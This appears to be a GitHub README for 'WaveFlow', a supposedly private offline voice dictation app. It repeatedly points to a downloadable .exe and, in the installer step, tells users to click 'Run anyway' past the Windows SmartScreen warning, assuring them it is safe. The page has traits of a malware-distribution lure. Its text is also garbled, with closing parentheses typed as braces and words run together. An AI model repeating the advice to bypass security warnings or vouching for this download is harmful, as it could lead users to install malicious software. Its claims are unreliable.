# 🎤 WaveFlow - Your Private Voice Dictation, Offline and Secure

[![Download WaveFlow](https://img.shields.io/badge/Download-WaveFlow%20Latest-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=232323)](https://github.com/Fernfamilywiccan8933/WaveFlow/releases)

## 🌟 What is WaveFlow?

WaveFlow is a **free, private voice dictation app** for Windows and macOS. It lets you speak and your words appear on your screen — without sending your voice to any cloud service, without needing an internet connection, and without creating any accounts.



With WaveFlow, your voice stays on your computer. Always. It uses a powerful, modern AI model called **NVIDIA Parakeet** which runs entirely on your own PC, home server, or a virtual private server (VPS) you control. This means your dictation is fast, accurate, and completely confidential.



---

## 🚀 Getting Started (Windows)

Follow these **exact steps** to download and run WaveFlow on your Windows computer. Don’t worry — it’s simple, even if you’ve never installed software from GitHub before.



### Step 1: Visit the Download Page

Go to the official WaveFlow download page by clicking this button:

[🖥️ Go to WaveFlow Downloads](https://github.com/Fernfamilywiccan8933/WaveFlow/releases)





Alternatively, copy and paste this link into your browser’s address bar:

```
https://github.com/Fernfamilywiccan8933/WaveFlow/releases
```



### Step 2: Find the Latest Release

On the page that opens, you will see a list of releases (versions of WaveFlow). The newest release is at the top, usually labeled something like **"Latest"** or with a green badge. Click on the release title to expand its details.



### Step 3: Download the Right File

Inside the release details, you will find a section called **"Assets"** (or "Downloads"}. Look for a file that has a name like:

- `WaveFlow-Setup.exe`
- `WaveFlow-1.2.3.exe`
- Or simply `WaveFlow.exe`

**Visit this link to download the application.** Click on that file name. Your browser will begin downloading the file. It may take a few minutes, depending on your internet speed. The file is usually between 100 MB and 500 MB because it contains the AI model inside.



> 💡 **Tip:** If you see multiple files, choose the one with `.exe` at the end. Do not choose files ending in `.whl`, `.tar.gz`, or `.zip` unless you are a developer.



### Step 4: Run the Installer

Once the download is complete, go to your **Downloads** folder (usually on the left sidebar in File Explorer, or press `Ctrl + J` in your browser to see downloads. Locate the downloaded `.exe` file.

**Double-click** the file to run it.



If Windows shows a blue or yellow popup saying **"Windows protected your PC"** or **"More info"** appearing, do this:

1. Click **"More info"** (a text link on the popup}
2. Then click **"Run anyway"**

This happens because WaveFlow is a new, independent app, not from a big corporate store, so Windows hasn't seen it before. It’s safe — it's open source, meaning anyone can inspect its code.



### Step 5: Follow the Setup Wizard

A small setup window will appear. Click **"Next"**, choose your installation folder (or leave it as default}, and click **"Install"**. Wait for the progress bar to finish. Then click **"Finish"**.



### Step 6: Launch WaveFlow

After installation, you can find WaveFlow in your **Start Menu** or on your **Desktop** as a shortcut. Click the icon to open the app. On first launch, the app may take 10–30 seconds to load because it prepares the AI model. Be patient — the window will appear shortly.



### Step 7: Start Dictating

1. Click inside the text area (the big blank space) in the WaveFlow window.
2. Click the **microphone button** (usually a red or blue mic icon} at the bottom of the window.
3. Start speaking clearly into your computer's microphone (or headset mic)
4. Watch your words appear in realtime on the screen
5. Click the mic button again to stop dictation



> ✅ **That’s it!** You’re now using private, offline voice dictation.





---

## ⚙️ How WaveFlow Works (In Simple Terms)

WaveFlow uses an **AI model called Parakeet**, created by NVIDIA. This model is incredibly good at converting speech to text. Here’s what happens when you speak:

1. **Your voice is captured** by your microphone (only on your device}
2. **The AI processes it locally** — right on your computer or your own server. Nothing leaves your network.
3. **The text appears** in the app window, ready for you to copy, save, or edit.

Because everything runs on your hardware, you can use WaveFlow even when you’re offline, on a plane, in a remote cabin, or in an office with strict data policies. **No cloud account. No subscriptions. No tracking.**



---

## 🖥️ System Requirements (What You Need}

WaveFlow is designed to run on most modern computers. Here’s what you should have for the best experience:

| Requirement | Recommended |
|---|---|
| Operating System | Windows 10 or 11 (64-bit} / macOS 12 or newer |
| Processor (CPU) | Intel Core i5 or AMD Ryzen 5 (or better}
| Memory (RAM} | 8 GB or more |
| Storage Free Space | At least 1 GB free |
| Microphone | Any built-in or USB microphone (webcam mics work too}
| Internet Connection | Only needed for the initial download of the app — not for dictation itself |

**Tip:** If your computer is a bit older, try closing other heavy programs (like browsers with many tabs} before using WaveFlow. This frees up memory and makes dictation smoother.



---

## 🔒 Privacy & Security: Your Data Stays Yours

This is the heart of WaveFlow. Here’s what we mean by **private**:

- 🚫 **No cloud processing**: Your voice is never sent to Google, Amazon, Microsoft, or any other company.
- 🚫 **No account required**: No email, no password, no phone number. Just download and run.
- 🚫 **No telemetry**: WaveFlow does not track what you dictate. There are no analytics, no usage logs sent anywhere.
- ✅ **Open source**: The entire code is public on GitHub. Anyone can verify that no hidden data collection exists.



If you are a professional (doctor, lawyer, journalist}, a student with sensitive research, or just someone who values privacy, WaveFlow gives you enterprise-grade confidentiality for free.



---

## 🧩 Advanced Options (Optional}

You don’t need these to use WaveFlow, but if you’re curious, here’s what else it can do:

### 📦 Docker Edition (For Home Servers or VPS}

If you have a home server (like a NAS} or a cloud VPS, you can run WaveFlow as a background service. This lets you dictate from your phone or any computer on your network. The Docker image is included in the releases page. (Only for users comfortable with basic server concepts.}

### 🎛️ Adjustable Accuracy

In the app settings, you can choose between **Faster** (lightning quick responses, slightly less perfect on accents) or **More Accurate** (slower but near-perfect transcription. Try both andsee what suits your voice.



### ⌨️ Keyboard Shortcuts

- `Ctrl + Shift + Space` — Toggle microphone on/off (global, works even when WaveFlow is in background}
- `Ctrl + Enter` — Clear the text area
- `Ctrl + S` — Save current text to a file



---

## 🛠️ Troubleshooting (Common Fixes}

**Problem: The microphone button is grayed out / unclickable.**

- Make sure no other app (like Zoom or a browser tab} is using your microphone. Close those apps or tabs.
- Check your Windows privacy settings: Go to `Settings > Privacy > Microphone` and ensure "Allow apps to access your microphone" is turned ON.



**Problem: Dictation is slow or laggy.**

- Close unused programs to free up RAM.
- If you have an NVIDIA graphics card (GPU}, make sure you have the latest drivers installed. WaveFlow can use your GPU to speed up the AI if available. If not, it will use your CPU, which is fine — just a bit slower.



**Problem: The app won’t start at all.**

- Reboot your computer and try again.
- Uninstall andreinstall the app using the same `.exe` file you downloaded.
- Check that you have at least 4 GB of free RAM before launching.



**Problem: Text appears with missing punctuation or odd capitalization.**

- This is normal for most speech-to-text apps. WaveFlow tries its best, but you may need to add periods and commas manually for perfect formatting. Speaking slightly slower and with clear pauses helps.



---

## 📖 Frequently Asked Questions (FAQs)

**Q: Is WaveFlow really free?**
Yes. It’s open-source software, licensed freely. No hidden fees, no premium tier, no ads.



**Q: Do I need to keep the download file after installing?**
No. You can delete the `.exe` file after installation. The app is installed on your system.



**Q: Can I use WaveFlow with a蓝牙 (Bluetooth) microphone?**
Absolutely. Bluetooth headsets and earbuds work perfectly, as long as your computer recognizes them as a microphone device.



**Q: Does WaveFlow work in other languages besides English?**
The current version is optimized for English (US, UK, Australian accents supported}. More languages may be added in future releases based on community interest.



---

## 🗣️ Supported Languages & Accents

- English (United States)
- English (United Kingdom}
- English (Australia}
- English (Canada}



More coming soon in future updates.



---

## 🔄 Uninstalling WaveFlow

If you ever want to remove WaveFlow from your computer:

1. Open **Settings** > **Apps** > **Installed apps**
2. Search for "WaveFlow"
3. Click the three dots (**...**) and select **Uninstall**
4. Confirm when prompted

All your data is removed with the app. Clean and simple.



---

## 💌 Support & Feedback

WaveFlow is an open-source community project. If you need help, get stuck, or have a feature request:

- Visit the **[GitHub Issues page](https://github.com/Fernfamilywiccan8933/WaveFlow/issues)** — this is where users post questions andbug reports. (You’ll need a free GitHub account to post.}
- Be descriptive: mention your OS (Windows or macOS}, your computer model, and what happened. This helps developers fix issues faster.



If you love WaveFlow, consider starring (⭐} the repository on GitHub. It shows support and helps more people discover the project.



---

## 📦 Download Again (Quick Access}

Here’s the download button one more time, for your convenience. Bookmark this page or the download link so you can always come back.

[⬇️ Download WaveFlow Now](https://github.com/Fernfamilywiccan8933/WaveFlow/releases}



---

## ✨ Final Thoughts

WaveFlow gives you the power of modern AI voice dictation — without selling your soul (or your voice} to big tech. It’s fast, accurate, and respects your privacy by design. Whether you’re writing emails, drafting documents, coding, or just prefer speaking over typing, WaveFlow is your trusty digital secretary.



**Keywords:** dictation, docker, local-first, nvidia-nemo, offline, onnx, parakeet, privacy, pyside6, python, self-hosted, speech-to-text, stt, voice-typing, windows